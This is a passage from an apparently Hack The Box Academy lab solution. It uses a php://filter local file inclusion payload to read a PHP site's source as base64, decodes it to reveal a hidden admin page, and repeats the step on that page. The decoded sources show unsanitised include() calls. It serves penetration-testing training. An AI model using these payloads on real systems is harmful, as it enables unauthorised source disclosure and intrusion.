view-source:http://STMIP:STMPO/index.php?page=php://filter/convert.base64-encode/resource=index
```

![[HTB Solutions/CPTS/z. images/fd22b666247736a0e59a6b92eb86a613_MD5.jpg]]

Students need to decode the base64-encoded `index` page:

Code: shell

```shell
echo 'PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDx0aXRsZT5JbmxhbmVGcmVpZ2h0PC90aXRsZT4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgc2hyaW5rLXRvLWZpdD1ubyI+CgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9UG9wcGluczoyMDAsMzAwLDQwMCw3MDAsOTAwfERpc3BsYXkrUGxheWZhaXI6MjAwLDMwMCw0MDAsNzAwIj4gCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImZvbnRzL2ljb21vb24vc3R5bGUuY3NzIj4KCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9ib290c3RyYXAubWluLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9tYWduaWZpYy1wb3B1cC5jc3MiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3MvanF1ZXJ5LXVpLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9vd2wuY2Fyb3VzZWwubWluLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9vd2wudGhlbWUuZGVmYXVsdC5taW4uY3NzIj4KCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9ib290c3RyYXAtZGF0ZXBpY2tlci5jc3MiPgoKICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iZm9udHMvZmxhdGljb24vZm9udC9mbGF0aWNvbi5jc3MiPgoKCgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3MvYW9zLmNzcyI+CgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3Mvc3R5bGUuY3NzIj4KICAgIAogIDwvaGVhZD4KICA8Ym9keT4KICAKICA8ZGl2IGNsYXNzPSJzaXRlLXdyYXAiPgoKICAgIDxkaXYgY2xhc3M9InNpdGUtbW9iaWxlLW1lbnUiPgogICAgICA8ZGl2IGNsYXNzPSJzaXRlLW1vYmlsZS1tZW51LWhlYWRlciI+CiAgICAgICAgPGRpdiBjbGFzcz0ic2l0ZS1tb2JpbGUtbWVudS1jbG9zZSBtdC0zIj4KICAgICAgICAgIDxzcGFuIGNsYXNzPSJpY29uLWNsb3NlMiBqcy1tZW51LXRvZ2dsZSI+PC9zcGFuPgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgICAgPGRpdiBjbGFzcz0ic2l0ZS1tb2JpbGUtbWVudS1ib2R5Ij48L2Rpdj4KICAgIDwvZGl2PgogICAgCiAgICA8aGVhZGVyIGNsYXNzPSJzaXRlLW5hdmJhciBweS0zIiByb2xlPSJiYW5uZXIiPgoKICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8ZGl2IGNsYXNzPSJyb3cgYWxpZ24taXRlbXMtY2VudGVyIj4KICAgICAgICAgIAogICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTExIGNvbC14bC0yIj4KICAgICAgICAgICAgPGgxIGNsYXNzPSJtYi0wIj48YSBocmVmPSJpbmRleC5waHAiIGNsYXNzPSJ0ZXh0LXdoaXRlIGgyIG1iLTAiPklubGFuZUZyZWlnaHQ8L2E+PC9oMT4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTEyIGNvbC1tZC0xMCBkLW5vbmUgZC14bC1ibG9jayI+CiAgICAgICAgICAgIDxuYXYgY2xhc3M9InNpdGUtbmF2aWdhdGlvbiBwb3NpdGlvbi1yZWxhdGl2ZSB0ZXh0LXJpZ2h0IiByb2xlPSJuYXZpZ2F0aW9uIj4KCiAgICAgICAgICAgICAgPHVsIGNsYXNzPSJzaXRlLW1lbnUganMtY2xvbmUtbmF2IG14LWF1dG8gZC1ub25lIGQtbGctYmxvY2siPgogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJhY3RpdmUiPjxhIGhyZWY9ImluZGV4LnBocCI+SG9tZTwvYT48L2xpPgogICAgICAgICAgICAgICAgPGxpPjxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWFib3V0Ij5BYm91dCBVczwvYT48L2xpPgogICAgICAgICAgICAgICAgPGxpPjxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWluZHVzdHJpZXMiPkluZHVzdHJpZXM8L2E+PC9saT4KICAgICAgICAgICAgICAgIDxsaT48YSBocmVmPSJpbmRleC5waHA/cGFnZT1jb250YWN0Ij5Db250YWN0PC9hPjwvbGk+CgkJPD9waHAgCgkJICAvLyBlY2hvICc8bGk+PGEgaHJlZj0iaWxmX2FkbWluL2luZGV4LnBocCI+QWRtaW48L2E+PC9saT4nOyAKCQk/PgogICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvbmF2PgogICAgICAgICAgPC9kaXY+CgoKICAgICAgICAgIDxkaXYgY2xhc3M9ImQtaW5saW5lLWJsb2NrIGQteGwtbm9uZSBtbC1tZC0wIG1yLWF1dG8gcHktMyIgc3R5bGU9InBvc2l0aW9uOiByZWxhdGl2ZTsgdG9wOiAzcHg7Ij48YSBocmVmPSIjIiBjbGFzcz0ic2l0ZS1tZW51LXRvZ2dsZSBqcy1tZW51LXRvZ2dsZSB0ZXh0LXdoaXRlIj48c3BhbiBjbGFzcz0iaWNvbi1tZW51IGgzIj48L3NwYW4+PC9hPjwvZGl2PgoKICAgICAgICAgIDwvZGl2PgoKICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CiAgICAgIAogICAgPC9oZWFkZXI+CgogIAoKICAgIDxkaXYgY2xhc3M9InNpdGUtYmxvY2tzLWNvdmVyIG92ZXJsYXkiIHN0eWxlPSJiYWNrZ3JvdW5kLWltYWdlOiB1cmwoaW1hZ2VzL2hlcm9fYmdfMS5qcGcpOyIgZGF0YS1hb3M9ImZhZGUiIGRhdGEtc3RlbGxhci1iYWNrZ3JvdW5kLXJhdGlvPSIwLjUiPgogICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxkaXYgY2xhc3M9InJvdyBhbGlnbi1pdGVtcy1jZW50ZXIganVzdGlmeS1jb250ZW50LWNlbnRlciB0ZXh0LWNlbnRlciI+CgogICAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTgiIGRhdGEtYW9zPSJmYWRlLXVwIiBkYXRhLWFvcy1kZWxheT0iNDAwIj4KICAgICAgICAgICAgCgogICAgICAgICAgICA8aDEgY2xhc3M9InRleHQtd2hpdGUgZm9udC13ZWlnaHQtbGlnaHQgbWItNSB0ZXh0LXVwcGVyY2FzZSBmb250LXdlaWdodC1ib2xkIj5Xb3JsZHdpZGUgRnJlaWdodCBTZXJ2aWNlczwvaDE+CiAgICAgICAgICAgIDxwPjxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLXByaW1hcnkgcHktMyBweC01IHRleHQtd2hpdGUiPkdldCBTdGFydGVkITwvYT48L3A+CgogICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+ICAKCjw/cGhwCmlmKCFpc3NldCgkX0dFVFsncGFnZSddKSkgewogIGluY2x1ZGUgIm1haW4ucGhwIjsKfQplbHNlIHsKICAkcGFnZSA9ICRfR0VUWydwYWdlJ107CiAgaWYgKHN0cnBvcygkcGFnZSwgIi4uIikgIT09IGZhbHNlKSB7CiAgICBpbmNsdWRlICJlcnJvci5waHAiOwogIH0KICBlbHNlIHsKICAgIGluY2x1ZGUgJHBhZ2UgLiAiLnBocCI7CiAgfQp9Cj8+CiAgICA8Zm9vdGVyIGNsYXNzPSJzaXRlLWZvb3RlciI+CiAgICAgICAgPGRpdiBjbGFzcz0icm93IHB0LTUgbXQtNSB0ZXh0LWNlbnRlciI+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtMTIiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJib3JkZXItdG9wIHB0LTUiPgogICAgICAgICAgICA8cD4KICAgICAgICAgICAgPCEtLSBMaW5rIGJhY2sgdG8gQ29sb3JsaWIgY2FuJ3QgYmUgcmVtb3ZlZC4gVGVtcGxhdGUgaXMgbGljZW5zZWQgdW5kZXIgQ0MgQlkgMy4wLiAtLT4KICAgICAgICAgICAgQ29weXJpZ2h0ICZjb3B5OzxzY3JpcHQ+ZG9jdW1lbnQud3JpdGUobmV3IERhdGUoKS5nZXRGdWxsWWVhcigpKTs8L3NjcmlwdD4gQWxsIHJpZ2h0cyByZXNlcnZlZCB8IFRoaXMgdGVtcGxhdGUgaXMgbWFkZSB3aXRoIDxpIGNsYXNzPSJpY29uLWhlYXJ0IiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPiBieSA8YSBocmVmPSJodHRwczovL2NvbG9ybGliLmNvbSIgdGFyZ2V0PSJfYmxhbmsiID5Db2xvcmxpYjwvYT4KICAgICAgICAgICAgPCEtLSBMaW5rIGJhY2sgdG8gQ29sb3JsaWIgY2FuJ3QgYmUgcmVtb3ZlZC4gVGVtcGxhdGUgaXMgbGljZW5zZWQgdW5kZXIgQ0MgQlkgMy4wLiAtLT4KICAgICAgICAgICAgPC9wPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDwvZGl2PgogICAgPC9mb290ZXI+CiAgPC9kaXY+CgogIDxzY3JpcHQgc3JjPSJqcy9qcXVlcnktMy4zLjEubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LW1pZ3JhdGUtMy4wLjEubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LXVpLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvcG9wcGVyLm1pbi5qcyI+PC9zY3JpcHQ+CiAgPHNjcmlwdCBzcmM9ImpzL2Jvb3RzdHJhcC5taW4uanMiPjwvc2NyaXB0PgogIDxzY3JpcHQgc3JjPSJqcy9vd2wuY2Fyb3VzZWwubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LnN0ZWxsYXIubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LmNvdW50ZG93bi5taW4uanMiPjwvc2NyaXB0PgogIDxzY3JpcHQgc3JjPSJqcy9qcXVlcnkubWFnbmlmaWMtcG9wdXAubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvYm9vdHN0cmFwLWRhdGVwaWNrZXIubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvYW9zLmpzIj48L3NjcmlwdD4KCiAgPHNjcmlwdCBzcmM9ImpzL21haW4uanMiPjwvc2NyaXB0PgogICAgCiAgPC9ib2R5Pgo8L2h0bWw+Cg==' | base64 -d
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-0acwh0hrp7]─[~]
└──╼ [★]$ echo 'PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICA8aGVhZD4KICAgIDx0aXRsZT5JbmxhbmVGcmVpZ2h0PC90aXRsZT4KICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4KICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgc2hyaW5rLXRvLWZpdD1ubyI+CgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9UG9wcGluczoyMDAsMzAwLDQwMCw3MDAsOTAwfERpc3BsYXkrUGxheWZhaXI6MjAwLDMwMCw0MDAsNzAwIj4gCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImZvbnRzL2ljb21vb24vc3R5bGUuY3NzIj4KCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9ib290c3RyYXAubWluLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9tYWduaWZpYy1wb3B1cC5jc3MiPgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3MvanF1ZXJ5LXVpLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9vd2wuY2Fyb3VzZWwubWluLmNzcyI+CiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9vd2wudGhlbWUuZGVmYXVsdC5taW4uY3NzIj4KCiAgICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9ImNzcy9ib290c3RyYXAtZGF0ZXBpY2tlci5jc3MiPgoKICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgaHJlZj0iZm9udHMvZmxhdGljb24vZm9udC9mbGF0aWNvbi5jc3MiPgoKCgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3MvYW9zLmNzcyI+CgogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSJjc3Mvc3R5bGUuY3NzIj4KICAgIAogIDwvaGVhZD4KICA8Ym9keT4KICAKICA8ZGl2IGNsYXNzPSJzaXRlLXdyYXAiPgoKICAgIDxkaXYgY2xhc3M9InNpdGUtbW9iaWxlLW1lbnUiPgogICAgICA8ZGl2IGNsYXNzPSJzaXRlLW1vYmlsZS1tZW51LWhlYWRlciI+CiAgICAgICAgPGRpdiBjbGFzcz0ic2l0ZS1tb2JpbGUtbWVudS1jbG9zZSBtdC0zIj4KICAgICAgICAgIDxzcGFuIGNsYXNzPSJpY29uLWNsb3NlMiBqcy1tZW51LXRvZ2dsZSI+PC9zcGFuPgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgICAgPGRpdiBjbGFzcz0ic2l0ZS1tb2JpbGUtbWVudS1ib2R5Ij48L2Rpdj4KICAgIDwvZGl2PgogICAgCiAgICA8aGVhZGVyIGNsYXNzPSJzaXRlLW5hdmJhciBweS0zIiByb2xlPSJiYW5uZXIiPgoKICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICA8ZGl2IGNsYXNzPSJyb3cgYWxpZ24taXRlbXMtY2VudGVyIj4KICAgICAgICAgIAogICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTExIGNvbC14bC0yIj4KICAgICAgICAgICAgPGgxIGNsYXNzPSJtYi0wIj48YSBocmVmPSJpbmRleC5waHAiIGNsYXNzPSJ0ZXh0LXdoaXRlIGgyIG1iLTAiPklubGFuZUZyZWlnaHQ8L2E+PC9oMT4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPGRpdiBjbGFzcz0iY29sLTEyIGNvbC1tZC0xMCBkLW5vbmUgZC14bC1ibG9jayI+CiAgICAgICAgICAgIDxuYXYgY2xhc3M9InNpdGUtbmF2aWdhdGlvbiBwb3NpdGlvbi1yZWxhdGl2ZSB0ZXh0LXJpZ2h0IiByb2xlPSJuYXZpZ2F0aW9uIj4KCiAgICAgICAgICAgICAgPHVsIGNsYXNzPSJzaXRlLW1lbnUganMtY2xvbmUtbmF2IG14LWF1dG8gZC1ub25lIGQtbGctYmxvY2siPgogICAgICAgICAgICAgICAgPGxpIGNsYXNzPSJhY3RpdmUiPjxhIGhyZWY9ImluZGV4LnBocCI+SG9tZTwvYT48L2xpPgogICAgICAgICAgICAgICAgPGxpPjxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWFib3V0Ij5BYm91dCBVczwvYT48L2xpPgogICAgICAgICAgICAgICAgPGxpPjxhIGhyZWY9ImluZGV4LnBocD9wYWdlPWluZHVzdHJpZXMiPkluZHVzdHJpZXM8L2E+PC9saT4KICAgICAgICAgICAgICAgIDxsaT48YSBocmVmPSJpbmRleC5waHA/cGFnZT1jb250YWN0Ij5Db250YWN0PC9hPjwvbGk+CgkJPD9waHAgCgkJICAvLyBlY2hvICc8bGk+PGEgaHJlZj0iaWxmX2FkbWluL2luZGV4LnBocCI+QWRtaW48L2E+PC9saT4nOyAKCQk/PgogICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvbmF2PgogICAgICAgICAgPC9kaXY+CgoKICAgICAgICAgIDxkaXYgY2xhc3M9ImQtaW5saW5lLWJsb2NrIGQteGwtbm9uZSBtbC1tZC0wIG1yLWF1dG8gcHktMyIgc3R5bGU9InBvc2l0aW9uOiByZWxhdGl2ZTsgdG9wOiAzcHg7Ij48YSBocmVmPSIjIiBjbGFzcz0ic2l0ZS1tZW51LXRvZ2dsZSBqcy1tZW51LXRvZ2dsZSB0ZXh0LXdoaXRlIj48c3BhbiBjbGFzcz0iaWNvbi1tZW51IGgzIj48L3NwYW4+PC9hPjwvZGl2PgoKICAgICAgICAgIDwvZGl2PgoKICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CiAgICAgIAogICAgPC9oZWFkZXI+CgogIAoKICAgIDxkaXYgY2xhc3M9InNpdGUtYmxvY2tzLWNvdmVyIG92ZXJsYXkiIHN0eWxlPSJiYWNrZ3JvdW5kLWltYWdlOiB1cmwoaW1hZ2VzL2hlcm9fYmdfMS5qcGcpOyIgZGF0YS1hb3M9ImZhZGUiIGRhdGEtc3RlbGxhci1iYWNrZ3JvdW5kLXJhdGlvPSIwLjUiPgogICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgIDxkaXYgY2xhc3M9InJvdyBhbGlnbi1pdGVtcy1jZW50ZXIganVzdGlmeS1jb250ZW50LWNlbnRlciB0ZXh0LWNlbnRlciI+CgogICAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTgiIGRhdGEtYW9zPSJmYWRlLXVwIiBkYXRhLWFvcy1kZWxheT0iNDAwIj4KICAgICAgICAgICAgCgogICAgICAgICAgICA8aDEgY2xhc3M9InRleHQtd2hpdGUgZm9udC13ZWlnaHQtbGlnaHQgbWItNSB0ZXh0LXVwcGVyY2FzZSBmb250LXdlaWdodC1ib2xkIj5Xb3JsZHdpZGUgRnJlaWdodCBTZXJ2aWNlczwvaDE+CiAgICAgICAgICAgIDxwPjxhIGhyZWY9IiMiIGNsYXNzPSJidG4gYnRuLXByaW1hcnkgcHktMyBweC01IHRleHQtd2hpdGUiPkdldCBTdGFydGVkITwvYT48L3A+CgogICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+ICAKCjw/cGhwCmlmKCFpc3NldCgkX0dFVFsncGFnZSddKSkgewogIGluY2x1ZGUgIm1haW4ucGhwIjsKfQplbHNlIHsKICAkcGFnZSA9ICRfR0VUWydwYWdlJ107CiAgaWYgKHN0cnBvcygkcGFnZSwgIi4uIikgIT09IGZhbHNlKSB7CiAgICBpbmNsdWRlICJlcnJvci5waHAiOwogIH0KICBlbHNlIHsKICAgIGluY2x1ZGUgJHBhZ2UgLiAiLnBocCI7CiAgfQp9Cj8+CiAgICA8Zm9vdGVyIGNsYXNzPSJzaXRlLWZvb3RlciI+CiAgICAgICAgPGRpdiBjbGFzcz0icm93IHB0LTUgbXQtNSB0ZXh0LWNlbnRlciI+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbWQtMTIiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJib3JkZXItdG9wIHB0LTUiPgogICAgICAgICAgICA8cD4KICAgICAgICAgICAgPCEtLSBMaW5rIGJhY2sgdG8gQ29sb3JsaWIgY2FuJ3QgYmUgcmVtb3ZlZC4gVGVtcGxhdGUgaXMgbGljZW5zZWQgdW5kZXIgQ0MgQlkgMy4wLiAtLT4KICAgICAgICAgICAgQ29weXJpZ2h0ICZjb3B5OzxzY3JpcHQ+ZG9jdW1lbnQud3JpdGUobmV3IERhdGUoKS5nZXRGdWxsWWVhcigpKTs8L3NjcmlwdD4gQWxsIHJpZ2h0cyByZXNlcnZlZCB8IFRoaXMgdGVtcGxhdGUgaXMgbWFkZSB3aXRoIDxpIGNsYXNzPSJpY29uLWhlYXJ0IiBhcmlhLWhpZGRlbj0idHJ1ZSI+PC9pPiBieSA8YSBocmVmPSJodHRwczovL2NvbG9ybGliLmNvbSIgdGFyZ2V0PSJfYmxhbmsiID5Db2xvcmxpYjwvYT4KICAgICAgICAgICAgPCEtLSBMaW5rIGJhY2sgdG8gQ29sb3JsaWIgY2FuJ3QgYmUgcmVtb3ZlZC4gVGVtcGxhdGUgaXMgbGljZW5zZWQgdW5kZXIgQ0MgQlkgMy4wLiAtLT4KICAgICAgICAgICAgPC9wPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDwvZGl2PgogICAgPC9mb290ZXI+CiAgPC9kaXY+CgogIDxzY3JpcHQgc3JjPSJqcy9qcXVlcnktMy4zLjEubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LW1pZ3JhdGUtMy4wLjEubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LXVpLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvcG9wcGVyLm1pbi5qcyI+PC9zY3JpcHQ+CiAgPHNjcmlwdCBzcmM9ImpzL2Jvb3RzdHJhcC5taW4uanMiPjwvc2NyaXB0PgogIDxzY3JpcHQgc3JjPSJqcy9vd2wuY2Fyb3VzZWwubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LnN0ZWxsYXIubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LmNvdW50ZG93bi5taW4uanMiPjwvc2NyaXB0PgogIDxzY3JpcHQgc3JjPSJqcy9qcXVlcnkubWFnbmlmaWMtcG9wdXAubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvYm9vdHN0cmFwLWRhdGVwaWNrZXIubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0ianMvYW9zLmpzIj48L3NjcmlwdD4KCiAgPHNjcmlwdCBzcmM9ImpzL21haW4uanMiPjwvc2NyaXB0PgogICAgCiAgPC9ib2R5Pgo8L2h0bWw+Cg==' | base64 -d

<!DOCTYPE html>
<html lang="en">
  <SNIP>
		<?php 
		  // echo '<li><a href="ilf_admin/index.php">Admin</a></li>'; 
		?>
<SNIP>
```

From the decoded base64 `index` page, students will notice that there is a link to a hidden page, `ilf_admin/index.php`, thus, utilizing the same technique used for reading the source of the `index` page, students need to read the source of the `ilf_admin/index.php` page:

```
view-source:http://STMIP:STMPO/index.php?page=php://filter/convert.base64-encode/resource=ilf_admin/index
```

![[HTB Solutions/CPTS/z. images/9bcced49cdf19d066a1f2e25a27b07b7_MD5.jpg]]

Students need to decode the base64-encoded `ilf_admin/index` page:

Code: shell

```shell
echo 'PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIiA+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICA8dGl0bGU+SW5sYW5lRnJlaWdodDwvdGl0bGU+CiAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIuL3N0eWxlLmNzcyI+Cgo8L2hlYWQ+Cjxib2R5PgoKCjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4gICAgCiAgICB3aW5kb3cuaGlzdG9yeS5mb3J3YXJkKCk7CiAgICBmdW5jdGlvbiBwcmV2ZW50KCkKICAgIHsKICAgICB3aW5kb3cuaGlzdG9yeS5mb3J3YXJkKCk7IAogICAgfQogICAgPC9zY3JpcHQ+CgkKPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgaHJlZj0iYy5jc3MiIC8+CgoKCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+CmJvZHkgewoJcGFkZGluZy10b3A6IDYwcHg7CglwYWRkaW5nLWJvdHRvbTogNDBweDsKfQoKLnNpZGViYXItbmF2IHsKICBwYWRkaW5nOiA5cHggMDsKICBtYXJnaW4tdG9wOiAzMHB4Owp9Ci5tYWluUGFnZXsKCWhlaWdodDogMTAwJQp9CgpAbWVkaWEgKCBtYXgtd2lkdGggOiA5ODBweCkgewoJLyogRW5hYmxlIHVzZSBvZiBmbG9hdGVkIG5hdmJhciB0ZXh0ICovCgkubmF2YmFyLXRleHQucHVsbC1yaWdodCB7CgkJZmxvYXQ6IG5vbmU7CgkJcGFkZGluZy1sZWZ0OiA1cHg7CgkJcGFkZGluZy1yaWdodDogNXB4OwoJfQp9CgouZGlzcGxheSB7CiAgd2lkdGg6IDcwJTsKICBoZWlnaHQ6IDQwMHB4OwogIHBhZGRpbmctYm90dG9tOiAyNTBweDsKICBib3JkZXI6IDFweCBzb2xpZCBibGFjazsgCiAgbWFyZ2luLWxlZnQ6IDI1MHB4OwogIG1hcmdpbi10b3A6IDMwcHg7CiAgb3ZlcmZsb3cteTogc2Nyb2xsOwp9Cgo8L3N0eWxlPgoKPHRpdGxlPklubGFuZUZyZWlnaHQ8L3RpdGxlPgo8L2hlYWQ+Cgo8Ym9keSBvbmxvYWQ9InByZXZlbnQoKTsiICBvbnVubG9hZD0iIj4KCTxkaXYgY2xhc3M9Im5hdmJhciBuYXZiYXItaW52ZXJzZSBuYXZiYXItZml4ZWQtdG9wIj4KCQk8ZGl2IGNsYXNzPSJuYXZiYXItaW5uZXIiPgoJCQk8ZGl2IGNsYXNzPSJjb250YWluZXItZmx1aWQiPgoJCQkJPGEgY2xhc3M9ImJyYW5kIj5BZG1pbiBQYW5lbDwvYT4KCQkJCTxkaXYgY2xhc3M9Im5hdi1jb2xsYXBzZSBjb2xsYXBzZSI+CgkJCTwvZGl2PgoJCTwvZGl2PgoJPC9kaXY+CgoJPGRpdiBjbGFzcz0iY29udGFpbmVyLWZsdWlkIj4KCQk8ZGl2IGNsYXNzPSJyb3ctZmx1aWQgbWFpblBhZ2UiPgoJCQk8ZGl2IGNsYXNzPSJ3cmFwcGVyIj4KCQkJCTxkaXYgY2xhc3M9IndlbGwgc2lkZWJhci1uYXYiPgoJCQkJCTx1bCBpZD0ic2lkZUJhciIgY2xhc3M9Im5hdiBuYXYtbGlzdCI+CgkJCQkJCTxsaSBjbGFzcz0ibmF2LWhlYWRlciI+RGF0YSBMb2dzPC9saT4KCQkJCQkJCTxsaSBpZD0ibXRtaS1tZW51IiBuYW1lPSJtb250aGluZm8iPjxhIGhyZWY9ImluZGV4LnBocD9sb2c9Y2hhdC5sb2ciPjxzcGFuPkNoYXQgTG9nPC9zcGFuPjwvYT48L2xpPgoJCQkJCQkJPGxpIGlkPSJtdG1pLW1lbnUiIG5hbWU9Im10bWkiPjxhIGhyZWY9ImluZGV4LnBocD9sb2c9aHR0cC5sb2ciPjxzcGFuPlNlcnZpY2UgTG9nPC9zcGFuPjwvYT48L2xpPgoJCQkJCQk8bGkgY2xhc3M9Im5hdi1oZWFkZXIiPlBlcmZvcm1hbmNlIFZpZXc8L2xpPgoJCQkJCQkJPGxpIGlkPSJtb250aGluZm8tbWVudSIgbmFtZT0ibW9udGhpbmZvIj48YSBocmVmPSJpbmRleC5waHA/bG9nPXN5c3RlbS5sb2ciPjxzcGFuPlN5c3RlbSBMb2c8L3NwYW4+PC9hPjwvbGk+CgkJCQkJPC91bD4KCQkJCTwvZGl2PgoJCQkJPCEtLS8ud2VsbCAtLT4KCQkJPC9kaXY+CgkJPC9kaXY+Cgk8L2Rpdj4KCTxkaXYgY2xhc3M9ImRpc3BsYXkiPgoJPD9waHAKCWlmKGlzc2V0KCRfR0VUWydsb2cnXSkpIHsKCSAgJGxvZyA9ICJsb2dzLyIgLiAkX0dFVFsnbG9nJ107CgkgIGVjaG8gIjxwcmU+IjsKCSAgaW5jbHVkZSAkbG9nOwoJICBlY2hvICI8L3ByZT4iOwoJfQoJPz4KCTwvZGl2PgoJCgk8c2NyaXB0IHNyYz0ianMvanF1ZXJ5LmpzIj48L3NjcmlwdD4KCTxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0IiBzcmM9ImpzL2Jvb3RzdHJhcC5qcyI+PC9zY3JpcHQ+CgkKPC9ib2R5Pgo8L2h0bWw+CjwhLS0gcGFydGlhbCAtLT4KICAKPC9ib2R5Pgo8L2h0bWw+Cg==' | base64 -d
```

```
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-0acwh0hrp7]─[~]
